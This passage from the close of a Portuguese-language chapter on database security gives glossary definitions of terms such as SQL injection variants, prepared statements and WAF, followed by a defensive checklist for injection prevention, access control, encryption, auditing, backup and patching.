- **NoSQL:** Banco de dados que nao usa o modelo relacional tradicional
- **ORM (Object-Relational Mapping):** Mapeamento objeto-relacional
- **Parameterized Query:** Consulta SQL que separa estrutura de dados
- **Prepared Statement:** Consulta SQL compilada e cacheada para execucao multipla
- **SQL Injection:** Ataque que insere codigo SQL malicioso em consultas
- **Stored Procedure:** Conjunto de instrucoes SQL armazenadas no banco de dados
- **TDE (Transparent Data Encryption):** Criptografia transparente de dados
- **Time-Based Blind:** Tipo de blind SQL injection que usa tempo de resposta
- **UNION-based:** Tipo de SQL injection que usa a clausula UNION
- **WAF (Web Application Firewall):** Firewall para aplicacoes web
- **XSS (Cross-Site Scripting):** Ataque de injecao de scripts em paginas web

---

## Checklist de Seguranca para Banco de Dados

### Prevencao de SQL Injection

- [ ] Todas as queries usam parameterized queries
- [ ] ORM esta configurado corretamente
- [ ] Stored procedures nao concatenam inputs
- [ ] Validacao de entrada em todos os pontos de contato
- [ ] WAF configurado para detectar SQL injection

### Controle de Acesso

- [ ] Principio do menor privilegio implementado
- [ ] Usuarios de aplicacao nao sao superusers
- [ ] Senhas fortes e unicas para todos os usuarios
- [ ] Autenticacao multifator habilitada quando possivel
- [ ] Contas inativas desabilitadas

### Criptografia

- [ ] SSL/TLS habilitado para conexoes
- [ ] Dados sensiveis criptografados em repouso
- [ ] Chaves de criptografia gerenciadas adequadamente
- [ ] Backup criptografado
- [ ] Logs criptografados quando contem dados sensiveis

### Auditoria e Monitoramento

- [ ] Logs de conexao habilitados
- [ ] Logs de queries habilitados (com cuidado)
- [ ] Alertas para atividades suspeitas
- [ ] Revisao periodica de logs
- [ ] Retencao de logs adequada

### Backup e Recuperacao

- [ ] Backup automatico configurado
- [ ] Backup testado regularmente
- [ ] Backup criptografado
- [ ] Plano de recuperacao documentado
- [ ] RTO e RPO definidos

### Atualizacao e Manutencao

- [ ] Banco de dados atualizado com patches de seguranca
- [ ] Vulnerabilidades conhecidas verificadas regularmente
- [ ] Configuracoes revisadas periodicamente
- [ ] Documentacao atualizada
- [ ] Treinamento da equipe realizado

---

*Fim do Capitulo 04*

*Proximo capitulo: Capitulo 05 — Autenticacao e Controle de Acesso*
